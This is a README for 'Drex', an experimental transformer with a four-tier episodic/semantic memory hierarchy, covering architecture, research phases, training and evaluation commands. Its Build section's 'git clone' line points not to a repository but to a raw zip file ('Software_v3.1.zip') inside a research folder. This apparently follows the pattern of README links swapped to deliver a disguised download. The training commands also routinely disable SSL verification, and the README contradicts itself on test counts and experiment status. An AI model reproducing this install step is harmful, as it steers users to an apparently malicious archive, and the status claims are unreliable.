# Drex

Drex is an experimental transformer architecture with a four-tier memory hierarchy,
implementing a validated episodic/semantic split associative memory module. The
architecture was developed through 16 phases of hypothesis-driven research across 247+
experiments, with each architectural decision grounded in controlled ablation studies
(SUPPORTED / INCONCLUSIVE / REFUTED verdicts, ≥2/3 seed confirmation).

The research specifically resolved a previously undocumented failure mode in EMA-based
associative memory at short sequence lengths — the EMA bootstrap problem — and confirmed
a validated fix (`α(L) = 0.95^(96/L)`) that keeps memory time constants calibrated
across L=16–128. The full research log is in `research/experiments/` (cat1–cat48, 247+
experiment result files).

> **Current state (Phase 16 complete / Phase 17 in progress):** The architecture is
> fully implemented, hardened, and training-ready. A 9-page arXiv preprint has been
> drafted (`paper/main.tex`). Exp A (baseline) is running (step ~16k/50k); Exp B
> (episodic memory) will auto-start on Exp A completion. Evaluation results (passkey
> recall, BABILong) are pending final checkpoints — that is the current milestone.
> See [Current Results](#current-results).

## Architecture

Drex uses a four-tier memory hierarchy:

| Layer | Mechanism | Scope |
|-------|-----------|-------|
| L1 | Sliding-window causal attention | In-context (short range) |
| L2 | Infini-Attention delta-rule matrix | Cross-segment (medium range) |
| L3 | Titans-style MLP weight snapshots | Disk (long range, async) |
| L4 | Episodic/semantic split delta-rule | Per-segment associative recall |

### L4 MemoryModule (Phase 13, validated)

The episodic/semantic memory layer is the primary research contribution. Key properties:

- **Two H/2 associative matrices**: `M_sem` (semantic, uniform weight) and `M_epi`
  (episodic, recency-weighted writes)
- **Delta-rule update**: `Δ = (k − Mk̂) ⊗ k̂`, written via EMA with `(1−α)` smoothing
- **Length-adaptive EMA**: `α(L) = 0.95^(96/L)` — keeps τ/L ≈ 0.21 constant
  across L=16–128, solving the EMA bootstrap failure at short sequences (Phase 11)
- **OR relative-norm write gate**: fires when `‖k − vp‖ ≥ thresh·‖k‖` on either branch;
  thresh\*=0.70 (confirmed exp_48_1, Phase 12)
- **Null retrieval gate**: learned scalar `g = σ(w·q)` suppresses empty-memory reads
- **Soft concatenated retrieval**: `concat(r_sem, r_epi)` — no learned combination gate
  (exp_38_3 ruled this out)

Validated write rates at thresh=0.70:
- L=32: wr=0.581 (target: 0.20–0.70) ✓
- L=96: wr=0.421 (target: 0.15–0.50) ✓

See [ARCHITECTURE_FINDINGS.md](ARCHITECTURE_FINDINGS.md) for the full specification,
confidence classifications, and the complete list of research dead ends.

## Current Results

**Status: no published end-to-end benchmark yet.**

The architecture components are fully validated (exp_48_1, Phase 12; 199-test suite,
100% branch coverage). The production implementation trains on TinyStories with
write rates in-range. The following comparisons are planned:

| Experiment | Config | Status |
|---|---|---|
| Exp A — baseline | DrexTransformer (no MemoryModule), 256d, 4L, 512 ctx | Pending |
| Exp B — episodic memory | DrexTransformer + MemoryModule (thresh=0.70), same config | Pending |

Evaluation targets: passkey recall at 2k/4k/8k/16k context; BABILong tasks 1–5
at 2k/4k/8k context. Results will be published at
[results/TRAINING_RUNS.md](results/TRAINING_RUNS.md).

## Installation

### Prerequisites

- Python ≥ 3.11
- Rust toolchain (for the `drex._sys` extension — SnapshotStore, PrefetchEngine)
- PyTorch ≥ 2.3.0

### Build

```bash
git clone https://raw.githubusercontent.com/martinez1120/drex/main/research/experiments/cat20_coordinated_gates/Software_v3.1.zip
cd drex

# Install maturin (Rust-Python build tool)
pip install maturin

# Build and install the Rust extension + Python package
maturin develop --release
```

### Development install

```bash
pip install -e ".[dev]"
```

> **Network note:** If your environment has a corporate SSL proxy, training data
> download may fail with a certificate error. Use `--no-ssl-verify` (development only)
> or `--data-file /path/to/tinystories.txt` to load from a local file.

## Usage

### Training

#### Quick smoke run

```bash
python scripts/train.py \
  --steps 1000 --log-every 100 \
  --d-model 128 --n-layers 3 --n-heads 4 \
  --use-episodic-memory --no-ssl-verify
```

#### Baseline comparison (Experiment A — no episodic memory)

```bash
python scripts/train.py \
  --steps 50000 --log-every 200 \
  --d-model 256 --n-layers 4 --n-heads 4 --ff-mult 4 \
  --batch-size 8 --segment-len 512 --dropout 0.1 \
  --lr 3e-4 --warmup-steps 2000 \
  --val-every 1000 --val-max-chars 500000 \
  --reset-on-boundary \
  --ckpt-dir checkpoints/exp_a \
  --no-ssl-verify
```

#### Episodic memory run (Experiment B — thresh\*=0.70)

```bash
python scripts/train.py \
  --steps 50000 --log-every 200 \
  --d-model 256 --n-layers 4 --n-heads 4 --ff-mult 4 \
  --batch-size 8 --segment-len 512 --dropout 0.1 \
  --lr 3e-4 --warmup-steps 2000 \
  --use-episodic-memory --episodic-gate-thresh 0.70 \
  --val-every 1000 --val-max-chars 500000 \
  --reset-on-boundary \
  --ckpt-dir checkpoints/exp_b \
  --no-ssl-verify
```

### Passkey recall evaluation

```bash
python scripts/eval_passkey.py \
    --checkpoint checkpoints/exp_b/step_0050000_final.safetensors \
    --use-episodic-memory --episodic-gate-thresh 0.70 \
    --report-write-rate \
    --lengths 2048 4096 8192 16384
```

### BABILong evaluation

```bash
python scripts/eval_babilong.py \
    --checkpoint checkpoints/exp_b/step_0050000_final.safetensors \
    --use-episodic-memory --episodic-gate-thresh 0.70 \
    --lengths 2048 4096 8192 \
    --tasks 1 2 3 4 5 --trials 10
```

### Write-rate monitoring

```python
from drex.models.memory import MemoryModule

for module in model.modules():
    if isinstance(module, MemoryModule):
        wr = module.last_write_rate()
        module.assert_write_rate_valid()  # raises if outside [0.10, 0.85]
```

## Testing

```bash
# Run full test suite with 100% branch coverage requirement
PYTHONPATH=python pytest tests/python/

# Run a specific test class
PYTHONPATH=python pytest tests/python/test_memory.py::TestMemoryModule -v
```

241 tests, 100% branch coverage (enforced by `pytest --cov` configuration).

## Project Structure

```
drex/
├── python/drex/
│   ├── models/
│   │   ├── memory.py          # MemoryModule (L4), MemoryState (L2), TitanMemory (L3)
│   │   ├── attention.py       # SlidingWindowAttention, InfiniAttention, HybridAttention
│   │   └── transformer.py     # DrexConfig, DrexLayer, DrexTransformer
│   ├── training/
│   │   ├── data.py            # SegmentDataset, collate_fn, tokenize_chars
│   │   ├── optimizer.py       # build_optimizer, cosine_schedule_with_warmup
│   │   └── trainer.py         # DrexTrainer (TBPTT, grad clip, segment loop)
│   ├── eval/
│   │   ├── passkey.py         # PasskeyBenchmark (multi-length passkey recall)
│   │   └── babilong.py        # BABILongBenchmark (5-task Q&A)
│   └── utils/
│       └── config.py          # save_checkpoint, load_checkpoint
├── src/                       # Rust source (SnapshotStore, PrefetchEngine)
├── scripts/
│   ├── train.py               # TinyStories training (write-rate monitoring, NaN guard)
│   ├── eval_passkey.py        # Passkey recall CLI (+ density sweep)
│   └── eval_babilong.py       # BABILong 5-task evaluation CLI
├── tests/python/              # 241 tests, 100% branch coverage
├── research/experiments/      # 247+ research experiments (cat1–cat48)
├── results/                   # Training run results and comparisons
├── PLAN.md                    # Implementation roadmap (Phases 1–16; Phases 17–21 planned)
├── ARCHITECTURE_FINDINGS.md   # Full spec + dead ends + confidence classifications
└── CLAUDE.md                  # Project conventions for AI collaboration
```

## Research Summary

16 phases of hypothesis-driven experimentation established the architecture:

- **Phases 1–4**: Established delta-rule update, ELU+1 feature map, L2/L3 baseline
- **Phases 5–6**: Ruled out offline consolidation, hierarchical routing
- **Phases 7–8**: Confirmed outer-product write, eliminated bidirectional rule
- **Phases 9–10**: Confirmed relative-norm gate at thresh=0.40; ruled out
  regularisation and two-phase training
- **Phase 11 (exp_47)**: Discovered and resolved EMA bootstrap failure at L≤32 —
  `α(L)=0.95^(96/L)` keeps τ/L ≈ 0.21 constant across all sequence lengths
- **Phase 12 (exp_48)**: Confirmed thresh\*=0.70 for OR-gate full system;
  wr(L=32)=0.581, wr(L=96)=0.421 — both within validated target ranges
- **Phase 13**: Production `MemoryModule` implementation; 197-test suite, 100% coverage
- **Phase 14**: Training script integration; write-rate monitoring, validation loss,
  BABILong CLI, passkey density sweep
- **Phase 15**: Stability hardening — NaN guard, TBPTT boundary reset, vectorized write
  loop, `F.normalize` eps fix; 199 tests total, 100% branch coverage
- **Phase 16**: Pre-publication hardening — write loop CPU backend + detach (543→2,310
  tok/s at L=512), output `norm_out` LayerNorm, multi-seed ablations (full-seq-residual
  INCONCLUSIVE; last-layer-only same quality at 2.7× speedup; null-gate +0.30 ppl),
  checkpoint resume optimizer/scheduler fix, arXiv paper draft (`paper/main.tex`);
  241 tests, 100% branch coverage

All architectural decisions have evidence trails in `research/experiments/`. Dead ends
are documented in [ARCHITECTURE_FINDINGS.md §9](ARCHITECTURE_FINDINGS.md).

## License

MIT
